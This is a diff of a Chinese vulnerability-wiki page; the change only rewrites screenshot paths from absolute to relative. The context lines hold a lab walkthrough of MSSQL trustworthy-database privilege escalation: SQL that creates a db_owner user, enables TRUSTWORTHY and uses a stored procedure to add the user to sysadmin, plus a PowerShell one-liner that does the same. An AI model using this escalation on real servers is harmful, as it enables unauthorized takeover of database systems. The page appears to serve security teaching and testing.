@@ -9,7 +9,7 @@ Mssql 受信用数据库提权
 
 测试服务器版本
 
-![1.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId22.png)
+![1.png](./.resource/Mssql受信用数据库提权/media/rId22.png)
 
 0x02创建用户，受信用数据库
 --------------------------
@@ -21,7 +21,7 @@ Mssql 受信用数据库提权
     FROM sys.databases
     WHERE name = 'MyTestdb01'
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId25.png)
+![2.png](./.resource/Mssql受信用数据库提权/media/rId25.png)
 
 #### 2.创建用户
 
@@ -29,7 +29,7 @@ Mssql 受信用数据库提权
 
     CREATE LOGIN MyAppUser01 WITH PASSWORD = 'MyPassword!';
 
-![3.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId27.png)
+![3.png](./.resource/Mssql受信用数据库提权/media/rId27.png)
 
 这里可以看到用户为public角色
 
@@ -42,7 +42,7 @@ DB\_owner权限，DB是database的缩写，owner即拥有者的意思。它是�
     CREATE USER [MyAppUser01] FROM LOGIN [MyAppUser01];
     EXEC sp_addrolemember [db_owner], [MyAppUser01];
 
-![4.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId29.png)
+![4.png](./.resource/Mssql受信用数据库提权/media/rId29.png)
 
 #### 4.确认\"MyAppUser01\"已添加为db\_owner
 
@@ -51,11 +51,11 @@ DB\_owner权限，DB是database的缩写，owner即拥有者的意思。它是�
     join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
     join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
 
-![5.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId31.png)
+![5.png](./.resource/Mssql受信用数据库提权/media/rId31.png)
 
 Myappuser01确实为db\_owner的权限
 
-![6.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId32.png)
+![6.png](./.resource/Mssql受信用数据库提权/media/rId32.png)
 
 查看myappusr01的属性也可以看到
 
@@ -63,7 +63,7 @@ Myappuser01确实为db\_owner的权限
 
     ALTER DATABASE MyTestdb01 SET TRUSTWORTHY ON
 
-![7.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId34.png)
+![7.png](./.resource/Mssql受信用数据库提权/media/rId34.png)
 
 #### 6.下面的查询将返回SQL Server实例中的所有数据库，并且应将\"MyTestdb01 \"和\"MSDB\"数据库标记为可信任。
 
@@ -72,7 +72,7 @@ Myappuser01确实为db\_owner的权限
     INNER JOIN sys.databases as b
     ON a.name=b.name;
 
-![8.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId36.png)
+![8.png](./.resource/Mssql受信用数据库提权/media/rId36.png)
 
 \"1\"就是受信用
 
@@ -86,14 +86,14 @@ Myappuser01确实为db\_owner的权限
     RECONFIGURE
     GO
 
-![9.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId38.png)
+![9.png](./.resource/Mssql受信用数据库提权/media/rId38.png)
 
 0x02 提权
 ---------
 
 1.使用MyAppUser01用户登录，新建查询，看看我们的权限，这里不要用之前的查询，因为那是sa的查询看看我们的是否为sysadmin
 
-![10.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId40.png)
+![10.png](./.resource/Mssql受信用数据库提权/media/rId40.png)
 
 2.新建一个sp\_elevate\_me查询
 
@@ -105,22 +105,22 @@ Myappuser01确实为db\_owner的权限
     EXEC sp_addsrvrolemember 'MyAppUser01','sysadmin'
     GO
 
-![11.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId41.png)
+![11.png](./.resource/Mssql受信用数据库提权/media/rId41.png)
 
 3.提权至sysadmin
 
     USE MyTestdb01
     EXEC sp_elevate_me
 
-![12.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId42.png)
+![12.png](./.resource/Mssql受信用数据库提权/media/rId42.png)
 
 再次检查权限
 
-![13.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId43.png)
+![13.png](./.resource/Mssql受信用数据库提权/media/rId43.png)
 
 已经是sysadmin权限了，查看用户的属性也可以看到已经到sysadmin权限了
 
-![14.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId44.png)
+![14.png](./.resource/Mssql受信用数据库提权/media/rId44.png)
 
 这里可以利用脚本已经一键利用
 
@@ -427,11 +427,11 @@ Myappuser01确实为db\_owner的权限
 
 首先我们先把sysadmin的权限取消掉，这里可以自行取消掉，但是要添加就会报错
 
-![15.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId46.png)
+![15.png](./.resource/Mssql受信用数据库提权/media/rId46.png)
 
     Invoke-SqlServer-Escalate-DbOwner -SqlUser MyAppUser01 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA
 
-![16.png](/Users/aresx/Documents/VulWiki/.resource/Mssql受信用数据库提权/media/rId47.png)
+![16.png](./.resource/Mssql受信用数据库提权/media/rId47.png)
 
 成功提权！！
 
